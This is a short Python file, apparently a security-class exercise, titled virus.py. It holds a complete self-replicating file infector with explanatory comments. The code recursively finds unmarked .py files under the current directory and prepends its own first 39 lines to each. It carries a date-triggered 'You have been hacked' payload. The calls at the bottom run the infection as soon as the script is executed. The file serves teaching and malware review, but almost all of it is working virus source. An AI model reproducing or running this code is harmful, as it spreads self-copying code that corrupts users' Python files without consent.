#Do not run this code

# Script Name:                virus.py                
# Class Name:                  Ops 301d8
# Author Name:                 David Siebert 
# Date of latest revision:     17JUN/2023
# Review a maliscious Python script 

#!/usr/bin/python3
import os
import datetime

SIGNATURE = "VIRUS"

def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# locate() function recursively searches for Python files in a directory and its subdirectories. It checks each file to see if it is infected by searching for a specific SIGNATURE string. The function collects the paths of non-infected Python files and returns them in a list.

def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

#the infect() function reads the current script file, extracts the first 39 lines (representing the virus code), and stores it in a string. It then iterates through the targeted files, reads their content, and overwrites them with the virus code followed by the original content. This process infects the targeted files with the virus.

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()

#this code first identifies the targeted files by calling the locate() function, then infects those files by calling the infect() function, and finally checks if the current date is May 9th and prints a message if it matches.